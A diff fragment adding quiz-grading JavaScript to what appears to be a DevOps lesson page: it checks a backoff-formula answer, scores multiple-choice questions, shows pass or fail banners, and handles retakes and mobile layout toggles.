+  const val=document.getElementById('q4-input').value.trim().toLowerCase().replace(/\s/g,'');
+  const fb=document.getElementById('q4-feedback');
+  const passed=val.includes('cap=min(')&&val.includes('max_delay')&&val.includes('base_delay*factor**attempt');
+  quizAnswers[4]=passed?'PASS':'FAIL';
+  fb.className='q-feedback show '+(passed?'correct':'wrong');
+  fb.textContent=passed
+    ?"✅ Correct! cap = min(max_delay, base_delay * factor ** attempt)"
+    :"❌ Not quite. You need something like: cap = min(max_delay, base_delay * factor ** attempt)";
+};
+
+function revealNextChapter(){
+  document.getElementById('next-chapter-card').style.display='flex';
+}
+
+window.submitQuiz=function(){
+  if(quizDone)return;
+  let score=0;
+  [1,2,3,5].forEach(q=>{
+    const correct=CORRECT[q];
+    const given=quizAnswers[q];
+    if(given===correct)score++;
+    document.querySelectorAll(`#q${q}-opts .q-opt`).forEach((b,i)=>{
+      const letter=String.fromCharCode(65+i);
+      if(letter===correct)b.classList.add('correct');
+      else if(letter===given&&given!==correct)b.classList.add('wrong');
+    });
+  });
+  if(quizAnswers[4]==='PASS')score++;
+  quizDone=true;
+  const passed=score>=4;
+  const banner=document.getElementById('quiz-result');
+  banner.className='quiz-result-banner show '+(passed?'pass':'fail');
+  document.getElementById('quiz-score-display').style.display='flex';
+  document.getElementById('quiz-score').textContent=score;
+  if(passed){
+    banner.innerHTML=`
+      <div class="qrb-title">🎉 Passed! ${score}/5 correct</div>
+      <div class="qrb-sub">Safe deletion, retry discipline, backoff with jitter, and shell-injection hygiene — the habits that make a script safe to leave running unattended. Check out the Interview Prep tab, then move on to DevOps 4.</div>`;
+    spark();
+    revealNextChapter();
+  }else{
+    banner.innerHTML=`
+      <div class="qrb-title">📚 ${score}/5 — Need one more correct</div>
+      <div class="qrb-sub">You need 4/5 to pass. Review the questions you got wrong, re-read those sections in the lesson, then retake.</div>
+      <button class="next-btn" style="background:var(--red);margin-top:12px" onclick="retakeQuiz()">Retake Quiz</button>`;
+    quizDone=false;
+  }
+};
+
+window.retakeQuiz=function(){
+  quizDone=false;
+  quizAnswers={1:null,2:null,3:null,4:null,5:null};
+  document.querySelectorAll('.q-opt').forEach(b=>{b.className='q-opt';});
+  document.getElementById('q4-input').value='';
+  document.getElementById('q4-feedback').className='q-feedback';
+  document.getElementById('quiz-result').className='quiz-result-banner';
+  document.getElementById('quiz-score-display').style.display='none';
+};
+
+function spark(){
+  const em=['🎉','⭐','✨','🔥','💫','🎯'];
+  for(let i=0;i<8;i++){
+    setTimeout(()=>{
+      const e=document.createElement('div');
+      e.className='spark';
+      e.style.left=(20+Math.random()*60)+'%';
+      e.style.top=(20+Math.random()*50)+'%';
+      e.textContent=em[Math.floor(Math.random()*em.length)];
+      document.body.appendChild(e);
+      setTimeout(()=>e.remove(),800);
+    },i*70);
+  }
+}
+
+window.toggleSidebar=function(){
+  document.getElementById('sidebar').classList.toggle('mob-open');
+};
+window.toggleMobConsole=function(){
+  document.getElementById('console-dock').classList.toggle('mob-open');
+};
+document.querySelectorAll('.sb-item').forEach(el=>{
+  el.addEventListener('click',()=>{
+    if(window.innerWidth<=820)
+      document.getElementById('sidebar').classList.remove('mob-open');
+  });
+});
+</script>
+
+</body>
+</html>
